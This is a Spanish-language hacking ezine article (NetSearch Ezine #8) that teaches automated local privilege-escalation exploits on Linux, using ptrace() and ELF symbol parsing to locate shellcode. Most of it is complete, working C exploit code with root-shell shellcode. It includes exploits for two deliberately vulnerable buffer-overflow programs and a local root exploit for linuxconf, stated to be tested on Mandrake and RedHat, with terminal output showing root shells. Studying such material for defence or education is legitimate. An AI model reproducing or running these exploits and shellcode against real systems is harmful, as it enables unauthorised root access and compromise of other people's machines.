@@ -1,0 +1,945 @@
+=-[ 0x04 ]-==================================================================
+=-[ NetSearch Ezine #8 ]-====================================================
+=-[ Automatizacion de xploits locales bajo Linux ]-==========================
+=-[ por RaiSe ]-=============================================================
+
+
+
+
+----------------
+// 0.- Indice
+----------------
+ 
+ 
+0.- Indice
+1.- Prologo
+
+2.- Averiguando Shellcode Address
+  2.1.- Shellcode en argv[*]
+  2.2.- Shellcode en stack
+
+3.- Ejemplo practico (linuxconf)
+4.- Despedida
+
+
+----------------
+// 1.- Prologo
+----------------
+
+
+Buenas, que tal? :). En este articulo voy a intentar describir una serie de
+tecnicas aplicables a xploits locales en linux. Por ejemplo: como calcular
+offsets sobre la marcha, calcular la direccion de la shellcode, averiguar la
+direccion de retorno a sobreescribir, etc.
+
+Para ello basicamente nos basaremos en la funcion ptrace(), y en el formato 
+ELF de los ficheros binarios de nuestro querido linux. Espero que os guste 
+:). Si teneis algun comentario que hacerme, idea, critica, o lo que sea, no 
+dudeis y escribirme a: raise@netsearch-ezine.com.
+
+
+
+--------------------------------------
+// 2.- Averiguando Shellcode Address
+--------------------------------------
+
+
+Uno de los problemas tipicos a la hora de programar un xploit local es como 
+calcular la direccion a la cual debe saltar el programa. Normalmente lo que 
+se hace es utilizar una funcion, llamada usualmente get_sp(), que a traves de 
+la direccion del registro %esp en el exploit, se 'intuye' la direccion de la 
+shellcode en el programa vulnerable. Aunque muchas veces funciona esto tiene 
+varios incovenientes, como la necesidad de usar el famoso offset por si 
+fallamos en el primer intento, asi como la obligacion de usar una cantidad 
+razonable de 'nops'.
+
+Nosotros lo que vamos a hacer es averiguarla sobre la marcha usando ptrace(). 
+Hay que resaltar que, aunque no se pueda debuggear un proceso que este 
+corriendo con uid de root, esto no es un incoveniente para nuestros 
+propositos. Lo que haremos sera empezar a debuggearlo 'antes' de que se 
+produzca el exec* del programa vulnerable con setuid 0. En las antiguas 
+versiones del kernel de linux esto era un fallo de seguridad, porque al 
+hacerse el exec* se ejecutaba con privilegios de root y el xploit era 
+trivial. Actualmente lo que hace es droppearse el uid 0 si el proceso se 
+esta debuggeando, pero a nosotros no nos importa, ya que lo unico que 
+queremos es reproducir la situacion exacta en la que mas tarde ejecutaremos 
+el xploit.
+
+Resumiendo, primero debuggeamos el proceso (con uid normal) para averiguar la 
+direccion exacta de la shellcode, y despues xplotamos (sin debuggear para que 
+se copie el uid 0) con el objetivo de conseguir el root.
+
+
+2.1.- Shellcode en argv[*]
+----------------------------
+
+Este es un caso tipico, y ademas el mas sencillo. Veamos el siguiente ejemplo 
+de codigo del abo1.c, que muchos conocereis ;) :
+
+
+<++> localxploits/abo1.c $c28e8c3c5caa2a7a9396968a51b41297
+int main(int argc,char **argv) {
+        char buf[256];
+ 
+        strcpy(buf,argv[1]);
+}
+<-->
+
+
+Como vemos, aqui la shellcode se puede encontrar en dos zonas de memoria, o
+en argv[1] o en buf. Por lo tanto podemos hacer dos cosas, aunque optaremos
+por la mas sencilla. La primera seria debuggear el programa y pararlo en la
+primera instruccion, y buscar la shellcode en argv[1] (la mas facil). La
+segunda seria debuggearlo y ejecutarlo hasta justo antes del strcpy, y mirar
+el argumento primero con el que se llama a la funcion, que sera la direccion
+exacta de nuestra shellcode. Obviamente ahora optaremos por la mas sencilla.
+Veamos el xploit para el abo1:
+
+
+<++> localxploits/xpabo1.c $52bc7537cc214119dfbe178fbc4747e7
+/* Exploit abo1.c */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <asm/user.h>
+#include <string.h>
+#include <unistd.h>
+
+
+unsigned long get_shell(void);
+
+char shellcode[]=
+"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc9\x51\xb8\x38"
+"\x65\x73\x68\x66\x35\x56\x4a\x50\xb8\x65\x65\x62\x69\x66\x35"
+"\x4a\x4a\x50\x89\xe3\x51\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
+"\xcd\x80";
+
+
+int main(void)
+{
+char buf[1024];
+unsigned long shell, *p;
+int i;
+
+
+memset(buf, 0, 1024);
+shell = get_shell();
+p = (unsigned long *) buf;
+
+for(i=0; i < 288; i+=4)
+    *p++ = shell;
+
+memcpy(buf, shellcode, strlen(shellcode));
+
+execl("./abo1", "abo1", buf, NULL);
+exit(-1);
+
+} /******* fin de main() ******/
+
+
+unsigned long get_shell(void)
+{
+unsigned long sc;
+struct user_regs_struct regs;
+int pid_vuln, n;
+
+
+/* creamos un proceso */
+if (!(pid_vuln = fork()))
+    {
+    char buf[1024];
+
+    sleep(2);
+    memset(buf, 0, 1024);
+    memset(buf, 0x41, 288);
+    execl("./abo1", "abo1", buf, NULL);
+
+    fprintf(stderr, "Error: execl.\n");
+    exit(-1);
+    }
+else
+    {
+
+    if (ptrace(PTRACE_ATTACH, pid_vuln))
+        {
+        fprintf(stderr, "Error: PTRACE_ATTACH.\n");
+        exit(-1);
+        }
+
+    waitpid(pid_vuln, NULL, 0);
+
+    printf("\n[* Averiguando esp .. ]\n");
+    fflush(stdout);
+
+    if (ptrace(PTRACE_CONT, pid_vuln, 0, 0))
+        {
+        fprintf(stderr, "Error: PTRACE_CONT.\n");
+        exit(-1);
+        }
+
+    waitpid(pid_vuln, NULL, 0);
+
+    if (ptrace(PTRACE_GETREGS, pid_vuln, 0, &regs))
+        {
+        fprintf(stderr, "Error: PTRACE_GETREGS.\n");
+        exit(-1);
+        }
+
+    printf("[* Iniciando busqueda en: 0x%08x ]\n", (int) regs.esp);
+    fflush(stdout);
+
+    n = 0, sc = 0;
+
+    do
+        {
+        if ((sc = ptrace(PTRACE_PEEKTEXT, pid_vuln,
+             (int)(regs.esp+(n++)), 0)) == -1)
+            {
+            fprintf(stderr, "Error: PTRACE_PEEKTEXT.\n");
+            exit(-1);
+            }
+
+        } while (sc != 0x41414141);
+
+    n--;
+    printf("[* Shellcode encontrada en: 0x%08x ]\n", (int)(regs.esp + n));
+    fflush(stdout);
+
+    if(ptrace(PTRACE_KILL, pid_vuln, 0, 0))
+        {
+        fprintf(stderr, "Error: PTRACE_KILL.\n");
+        exit(-1);
+        }
+    else
+        {
+        waitpid(pid_vuln, NULL, 0);
+        printf("[* Xplotando .. ]\n\n");
+        fflush(stdout);
+        sleep(1);
+        return((unsigned long)(regs.esp + n));
+        }
+    }
+
+} /********* fin de get_shell() **********/
+
+
+/* EOF */
+<-->
+
+
+Aunque parece un poco largo en realidad es muy sencillo. Get_shell() es la 
+funcion que nos devolvera la direccion _exacta_ de la shellcode. Para ello 
+primero lo ejecutamos debuggeandolo desde el proceso padre, y le metemos a
+argv[1] 288 A's. Es muy importante que el numero de argumentos, asi como la 
+longitud de los mismos, sea exactamente el mismo cuando debuggeamos que cuando 
+explotamos pq sino la direccion de la shellcode variaria.
+
+En el proceso hijo hacemos un sleep(2), para que al padre le de tiempo a
+attachearlo. En cuando esto sucede el hijo se detiene, y el padre espera por
+el con un waitpid. Le mandamos seguir con PTRACE_CONT, ejecuta el execl abo1
+con argv[1] = 288 A's. Se vuelve a detener justo al principio de abo1 (ahora
+ya con el contexto de memoria de abo1). Leemos los registros con
+PTRACE_GETREGS, y empezamos la busqueda en %esp. Como la shellcode la
+encontraremos en argv[1], estara en una direccion mas alta (de mayor valor)
+que %esp. Iniciamos un bucle con PTRACE_PEEKTEXT para ir leyendo palabra a
+palabra (de 4 bytes), hasta que coincida con 0x41414141. Una vez encontrada
+salimos del proceso debuggeado, y ejecutamos el xploit real con 288 bytes,
+con la shellcode al principio de argv[1] y usando la direccion que calculamos
+antes. Teoricamente deberia funcionar sin la necesidad ni de offsets, ni de
+nops.
+
+Probemos:
+
+
+[raise@alpha raise]$ ls -l abo1
+-rwsr-xr-x    1 root     root        13684 dic 17 00:10 abo1*
+[raise@alpha raise]$ ./xpabo1
+
+[* Averiguando esp .. ]
+[* Iniciando busqueda en: 0xbffff7c0 ]
+[* Shellcode encontrada en: 0xbffff912 ]
+[* Xplotando .. ]
+
+sh-2.05# id
+uid=0(root) gid=501(raise) groups=501(raise),43(usb)
+sh-2.05#
+
+
+Parece que funciona :). Veamos otro ejemplo un poco mas complicado [pero poco
+;)].
+
+
+2.1.- Shellcode en stack
+---------------------------
+
+Pues muy bien, pero que pasa si el codigo no es tan sencillo ?.. Imaginemos 
+lo siguiente:
+
+
+<++> localxploits/abo2.c $9e1fe2f4d5c318ba58da6b2d02c2b836
+int main(void) {
+        char buf[256];
+ 
+        gets(buf);
+}
+<-->
+
+
+Aqui ya no sirve lo de buscar en argv[*], puesto que justo al principio de
+la ejecucion del programa el buffer se encontrara vacio. Lo que tenemos que
+hacer es ir ejecutando codigo hasta que el buffer se copie al stack, o hasta 
+el call que llama a la funcion gets(), y una vez ahi mirar cual es su 
+argumento, usease la direccion de buf. 
+
+Bien, y como hacemos exactamente esto?. Necesitamos saber de antemano la 
+direccion de gets(), para poder ir ejecutando paso a paso con ptrace() y 
+detenernos cuando %eip sea igual a la direccion de gets(). Para ello 
+necesitaremos abrir el fichero (abo2 en este caso) antes de debuggear, y a 
+traves de la estructura ELF sacar dicha direccion. Mas o menos los pasos a 
+seguir son los siguientes:
+
+
+. A traves del elf header nos vamos a la section header table, y copiamos en 
+memoria los strings de la string table (.shstrtab), que contendra los nombres 
+de las secciones.
+
+. Buscamos la seccion con nombre .strtab que contendra los nombres de los 
+simbolos, entre otras cosas.
+
+. Nos vamos a la symbol table y buscamos el simbolo de la funcion gets().
+
+. Guardamos el valor de dicho simbolo, que sera una virtual address de la 
+entrada PLT (Procedure Linkage Table) de gets().
+
+
+Bueno, y una vez con la direccion de gets() ejecutamos abo2 (debuggeandolo), 
+y con una serie de tuberias le metemos 288 A's. Ejecutamos paso a paso hasta 
+la direccion de gets(), nos paramos, y miramos el valor del contenido de 
+memoria en %esp+4, ya que en %esp estara el valor de retorno (estamos justo 
+despues de un call), y ese sera el valor de nuestra shellcode :).
+
+Una vez con todos estos datos explotamos normalmente y deberia funcionar. 
+Probemos ..
+
+
+[raise@alpha raise]$ ls -l abo2
+-rwsr-xr-x    1 root     root        13561 sep 26 19:39 abo2*
+[raise@alpha raise]$ ./xpabo2
+
+Analizando ..
+gets() address: 0x080482d0
+shellcode address: 0xbffff780
+
+Xplotando..
+Deberias tener una shell aqui debajo ..
+(para salir control+c)
+
+id
+uid=0(root) gid=501(raise) groups=501(raise),43(usb) 
+[control+c]
+[raise@alpha raise]$
+
+
+Parece que rula. Para salir hay que darle a control+c ya que la shell es
+manejada por tuberias debido al gets() y demas. Aqui pego el codigo del
+xploit.
+
+
+<++> localxploits/xpabo2.c $68347ba1e1c1e9c37cbefb0d0bed4ef2
+/* Exploit de abo2.c */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/wait.h>
+#include <asm/user.h>
+#include <unistd.h>
+#include <elf.h>
+
+
+/* funciones */
+char *cargar_strtable(void);
+unsigned long load_gets(int sizest);
+void xploit(unsigned long getadr);
+unsigned long get_shell(unsigned long getadr);
+
+
+/* variables globales */
+Elf32_Ehdr elfheader;
+Elf32_Shdr sheader;
+char *strings, buf[1024];
+FILE *fp;
+
+char shellcode[]=
+"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc9\x51\xb8\x38"
+"\x65\x73\x68\x66\x35\x56\x4a\x50\xb8\x65\x65\x62\x69\x66\x35"
+"\x4a\x4a\x50\x89\xe3\x51\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
+"\xcd\x80";
+
+
+int main(void)
+{
+unsigned long dire_gets;
+int shindex = 0;
+
+
+if ((fp = fopen("abo2", "r")) == NULL)
+	{
+	fprintf(stderr, "Error al abrir abo2.\n");
+	exit(-1);
+	}
+
+if (fread((void *)&elfheader, sizeof(elfheader), 1, fp) < 1)
+	{
+	fprintf(stderr, "Error al leer ELF header.\n");
+	exit(-1);
+	}
+
+/* msg */
+printf("\nAnalizando ..\n");
+fflush(stdout);
+
+/* cargamos string table entera (.strtab) */
+strings = cargar_strtable();
+
+
+/* nos vamos al section header */
+if (fseek(fp, elfheader.e_shoff, SEEK_SET) == -1)
+	{
+	fprintf(stderr, "Error al ir al section header.\n");
+	exit(-1);
+	}
+
+/* buscamos el symbol table section */
+do	{
+  	fread((void *)&sheader, elfheader.e_shentsize, 1, fp);
+
+	if (sheader.sh_type == SHT_SYMTAB)
+		break;
+	else
+		shindex++;
+
+	} while (shindex < elfheader.e_shnum);
+
+/* symbol table not found */
+if (shindex >= elfheader.e_shnum)
+	{
+	fprintf(stderr, "Error: symbol table no encontrado.\n");
+	exit(-1);
+	}
+
+/* buscamos virtual address (PLT) de gets() */
+dire_gets = load_gets(sheader.sh_size);
+
+if (!dire_gets)
+	{
+	fprintf(stderr, "Error al cargar gets() address.\n");
+	exit(-1);
+	}
+
+fclose(fp);
+
+/* xplotamos (msg) */
+printf("gets() address: 0x%08x\n", (int)dire_gets);
+fflush(stdout);
+xploit(dire_gets);
+exit(-1);
+
+} /******* fin main() ********/
+
+
+char *cargar_strtable(void)
+{
+int strindex = elfheader.e_shstrndx;
+char *p;
+
+/* nos vamos al section header */
+if (fseek(fp, elfheader.e_shoff, SEEK_SET) == -1)
+    {
+    fprintf(stderr, "Error al ir al section header.\n");
+    exit(-1);
+    }
+
+/* buscamos string table (.shstrtab) */
+do  {
+    fread((void *)&sheader, elfheader.e_shentsize, 1, fp);
+
+    } while (strindex-- > 0);
+
+if (sheader.sh_type != SHT_STRTAB)
+	{
+	fprintf(stderr, "Error al buscar string table.\n");
+	exit(-1);
+	}
+
+/* vamos al primer byte de la string table */
+if (fseek(fp, sheader.sh_offset, SEEK_SET) == -1)
+    {
+    fprintf(stderr, "Error al ir al string section.\n");
+    exit(-1);
+    }
+
+p = malloc(sheader.sh_size);
+if (fread((void *)p, sheader.sh_size, 1, fp) < 1)
+	{
+	fprintf(stderr, "Error al leer string table.\n");
+	exit(-1);
+	}
+
+/** buscamos ahora .strtab **/
+
+/* nos vamos al section header */
+if (fseek(fp, elfheader.e_shoff, SEEK_SET) == -1)
+    {
+    fprintf(stderr, "Error al ir al section header.\n");
+    exit(-1);
+    }
+
+while(1)
+	{
+    fread((void *)&sheader, elfheader.e_shentsize, 1, fp);
+	
+	if (sheader.sh_type == SHT_STRTAB)
+		{
+		if (!strcmp((char *)(&p[sheader.sh_name]), ".strtab"))
+			{
+			fseek(fp, sheader.sh_offset, SEEK_SET);
+			free(p);
+			p = malloc(sheader.sh_size);
+		    fread((void *)p, sheader.sh_size, 1, fp);
+			return(p);
+    		}
+		}
+
+	} /* fin while(1) */	
+
+return(0);
+
+} /******* fin cargar_strtable() ********/
+
+
+unsigned long load_gets(int sizest)
+{
+Elf32_Sym symtable;
+int tsize = 0;
+
+
+/* vamos al primer byte de la symbol table */
+if (fseek(fp, sheader.sh_offset, SEEK_SET) == -1)
+    {
+    fprintf(stderr, "Error al ir a la symbol table.\n");
+    exit(-1);
+    }
+
+/* buscamos la funcion gets() */
+while(tsize < sizest)
+	{
+    fread((void *)&symtable, sizeof(symtable), 1, fp);
+	tsize += sizeof(symtable);
+
+	/* es 1 funcion ? */
+    if (ELF32_ST_TYPE(symtable.st_info) == STT_FUNC)
+		{
+		if (!strncmp((char *)(&strings[symtable.st_name]), "gets@", 4))
+			/* retornamos */
+			return(symtable.st_value);
+		}
+
+    } /* fin while(1) */
+
+return(0);
+
+} /********* fin load_gets()  ***********/
+
+
+void xploit(unsigned long getadr)
+{
+unsigned long shell, *p;
+int i, tuberia[2], pid;
+unsigned char tmp;
+fd_set s_read;
+
+
+memset(buf, 0, 1024);
+shell = get_shell(getadr);
+
+/* msg */
+printf("shellcode address: 0x%08x\n", (int)shell);
+fflush(stdout);
+
+p = (unsigned long *) buf;
+
+for(i=0; i < 288; i+=4)
+    *p++ = shell;
+
+memcpy(buf, shellcode, strlen(shellcode));
+
+sleep(1);
+printf("\nXplotando..\n");
+printf("Deberias tener una shell aqui debajo ..\n");
+printf("(para salir control+c)\n\n");
+fflush(stdout);
+
+pipe(tuberia);
+pid = fork();
+
+if (!pid)
+    {
+    dup2(tuberia[0], 0);
+    execl("./abo2", "abo2", NULL);
+    }
+else
+    {
+    sleep(1);
+    write(tuberia[1], buf, strlen(buf));
+	sleep(1);	
+
+	/* bucle para multiplexar i/o */
+	while(1)
+	    {
+	    FD_ZERO(&s_read);
+	    FD_SET(0, &s_read);
+	
+	    select(1, &s_read, 0, 0, NULL);
+	
+	    if (FD_ISSET(0, &s_read))
+	        {
+	        read(0, &tmp, 1);
+	        write(tuberia[1], &tmp, 1);
+	        }
+	
+	    } /* fin while(1) */
+
+    } /* fin else */
+
+kill(pid, 9);
+exit(0);
+
+} /********** fin xploit() ************/
+
+
+unsigned long get_shell(unsigned long getadr)
+{
+unsigned long sc;
+struct user_regs_struct regs;
+int pid_vuln, tuberia[2];
+
+
+/* creamos la tuberia */
+if (pipe(tuberia) == -1)
+	{
+	fprintf(stderr, "Error al crear la tuberia.\n");
+	exit(-1);
+	}
+
+/* creamos un proceso */
+if (!(pid_vuln = fork()))
+    {
+	/* duplicamos descriptores */
+	dup2(tuberia[0], 0);
+	dup2(tuberia[1], 1);
+
+    sleep(2);
+	execl("./abo2", "abo2", NULL);
+
+    exit(-1);
+    }
+else
+    {
+    memset(buf, 0, 1024);
+    memset(buf, 0x41, 288);
+	strcat(buf, "\n");
+
+    if (ptrace(PTRACE_ATTACH, pid_vuln))
+        {
+        fprintf(stderr, "Error: PTRACE_ATTACH.\n");
+        exit(-1);
+        }
+
+    waitpid(pid_vuln, NULL, 0);
+
+    if (ptrace(PTRACE_CONT, pid_vuln, 0, 0))
+        {
+        fprintf(stderr, "Error: PTRACE_CONT.\n");
+        exit(-1);
+        }
+
+    waitpid(pid_vuln, NULL, 0);
+	
+	/* printeamos el buffer */
+	write(tuberia[1], buf, strlen(buf));
+
+
+    /* bucle hasta gets() */
+    while(1)
+        {
+        ptrace(PTRACE_SINGLESTEP, pid_vuln, 0, 0);
+        waitpid(pid_vuln, NULL, 0);
+
+        if (ptrace(PTRACE_GETREGS, pid_vuln, 0, &regs) == -1)
+            {
+            fprintf(stderr, "Error: PTRACE_GETREGS\n");
+            exit(-1);
+            }
+		
+		if ((unsigned long) regs.eip == getadr)
+			{
+	        if ((sc = ptrace(PTRACE_PEEKTEXT, pid_vuln,
+	            (int)(regs.esp+4), 0)) == -1)
+ 	           {
+	            fprintf(stderr, "Error: PTRACE_PEEKTEXT, eip: 0x%08x  esp: 0x%08x\n",
+	                   (int) regs.eip, (int) regs.esp);
+	            exit(-1);
+	            }
+			else
+				{
+				ptrace(PTRACE_KILL, pid_vuln, 0, 0);
+				return(sc);
+				}
+			}
+
+        } /* fin while(1) */
+
+	} /* fin else */
+
+return(0);
+
+} /*********** fin get_shell() **********/
+
+/* EOF */
+<-->
+
+
+
+-------------------------
+// 3.- Ejemplo practico
+-------------------------
+
+
+Bueno, y que mejor que un xploit que funcione para comprobar que toda esta
+teoria es util :). Aqui incluyo un xploit local para el linuxconf. Esta
+testeado en Mandrake 8.0 y 8.2. La shellcode va en una variable de entorno, y
+su direccion se calcula debuggeando con ptrace(). Se supone que funcionaria
+en cualquier Mandrake (7.x) y Redhat vulnerable, ya que no utiliza offsets.  
+En este ejemplo el uso de esta tecnica es especialmete practica, ya que sino
+habria que calcular dos direcciones, no solo la de la shellcode, tambien la
+de un string que se usa para crear un fichero que el linuxconf necesita (sino 
+existe hace un exit()).
+
+Pues bien, aqui pego el codigo del xploit.
+
+
+<++> localxploits/nslconf.c $efe11c4dec10b6bc8800d53096f377f7
+/* 
+ * Linuxconf Local Xploit
+ * by RaiSe <raise@netsearch-ezine.com>
+ * http://www.netsearch-ezine.com
+ *
+ * Tested on:
+ *             Mandrake 8.0
+ *             Mandrake 8.2
+ *             RedHat   7.3
+ *
+ * (ejecutar sin argumentos en un directorio
+ *  con permisos de escritura)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <asm/user.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define PATHLCONF	"/sbin/linuxconf"
+
+
+unsigned long get_shell(void);
+
+char shellcode[]=  // by RaiSe
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc9\x51\xb8\x38"
+"\x65\x73\x68\x66\x35\x56\x4a\x50\xb8\x65\x65\x62\x69\x66\x35"
+"\x4a\x4a\x50\x89\xe3\x51\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
+"\xcd\x80";
+
+
+int main(void)
+{
+FILE *fp;
+char buf[2056], buf2[2048];
+unsigned long shell, *p;
+int i;
+
+
+printf("\n[ Linuxconf Local Xploit by RaiSe ]\n\n");
+fflush(stdout);
+
+sprintf(buf2, "%s.eng", shellcode);
+
+if (mkdir(buf2, S_IRWXU))
+	{
+	fprintf(stderr, "* Error: Imposible crear directorio, seguramente "
+                    "no tengas\nlos permisos necesarios en el path actual "
+					"o el directorio ya exista.\n\n");
+	exit(-1);
+	}
+else	
+	sprintf(buf2, "%s.eng/%s.eng", shellcode, shellcode);
+
+if ((fp = fopen(buf2, "w")) == NULL)
+	{
+    fprintf(stderr, "* Error: Imposible crear fichero, seguramente "
+                    "no tengas\nlos permisos necesarios en el path actual.\n\n");
+    exit(-1);
+	}
+else
+	fclose(fp);
+
+printf("* Directorio + fichero creado ..\n");
+printf("   [no olvides borrarlo ;)]\n");
+fflush(stdout);
+
+bzero(buf, sizeof(buf));
+shell = get_shell();
+
+p = (unsigned long *) buf;
+
+for (i = 0; i < 2048 ; i+=4)
+	*p++ = shell;
+
+
+setenv("SCODE", shellcode, 1);
+setenv("LINUXCONF_LANG",buf,1);
+execl(PATHLCONF, "linuxconf", NULL);
+
+exit(-1);
+
+} /******* fin de main() ******/
+
+
+unsigned long get_shell(void)
+{
+unsigned long sc;
+struct user_regs_struct regs;
+int pid_vuln, n;
+
+
+/* creamos un proceso */
+if (!(pid_vuln = fork()))
+	{
+	char buf[2056];
+
+	sleep(2);
+	bzero(buf, sizeof(buf));
+	memset(buf, 0x41, 2048);
+
+	setenv("SCODE", shellcode, 1);
+	setenv("LINUXCONF_LANG",buf, 1);
+	execl(PATHLCONF, "linuxconf", NULL);
+
+	fprintf(stderr, "Error: execl.\n");
+	exit(-1);
+	}
+else
+	{
+
+	if (ptrace(PTRACE_ATTACH, pid_vuln))
+		{
+		fprintf(stderr, "Error: PTRACE_ATTACH.\n");
+		exit(-1);
+		}
+
+	waitpid(pid_vuln, NULL, 0);
+
+    printf("\n[* Averiguando esp .. ]\n");
+	fflush(stdout);
+
+    if (ptrace(PTRACE_CONT, pid_vuln, 0, 0))
+        {
+        fprintf(stderr, "Error: PTRACE_CONT.\n");
+        exit(-1);
+        }
+
+    waitpid(pid_vuln, NULL, 0);
+
+    if (ptrace(PTRACE_GETREGS, pid_vuln, 0, &regs))
+        {
+        fprintf(stderr, "Error: PTRACE_GETREGS.\n");
+        exit(-1);
+        }
+
+	printf("[* Iniciando busqueda en: 0x%08x ]\n", (int) regs.esp);
+    fflush(stdout);
+
+	n = 0, sc = 0;
+
+	do 
+		{
+	    if ((sc = ptrace(PTRACE_PEEKTEXT, pid_vuln,
+			 (int)(regs.esp+(n++)), 0)) == -1)
+	        {
+	        fprintf(stderr, "Error: PTRACE_PEEKTEXT.\n");
+	        exit(-1);
+    	    }
+
+		} while (sc != 0x90909090);
+	
+	n--;
+	printf("[* Shellcode encontrada en: 0x%08x ]\n", (int)(regs.esp + n));
+	fflush(stdout);
+
+	if(ptrace(PTRACE_KILL, pid_vuln, 0, 0))
+		{
+		fprintf(stderr, "Error: PTRACE_KILL.\n");
+		exit(-1);
+		}
+	else
+		{
+		waitpid(pid_vuln, NULL, 0);
+		printf("[* Xplotando .. ]\n\n");
+		fflush(stdout);
+		sleep(1);
+		return((unsigned long)(regs.esp + n));
+		}
+	}
+
+} /********* fin de get_shell() **********/
+
+
+/* EOF */
+<-->
+
+
+
+-------------------
+// 4.- Despedida
+-------------------
+
+
+Aunque este tema da para mucho mas no considero oportuno enrollarme mas en un
+mismo articulo. Si eso para otro ezine escribo otro segundo articulo con
+tecnicas que no han sido tratadas, como una funcion para sacar la tipica
+entrada de una funcion en la Global Offset Table (GOT), para no tener que
+usar objdump por ejemplo. Tambien quedan ejemplos de xploits de heap, o de 
+strings de *printf().
+
+En fin, y nada mas, espero que les haya parecido un tema interesante. Un 
+saludo ;).
+
+
+RaiSe
+
+
+
+0x00
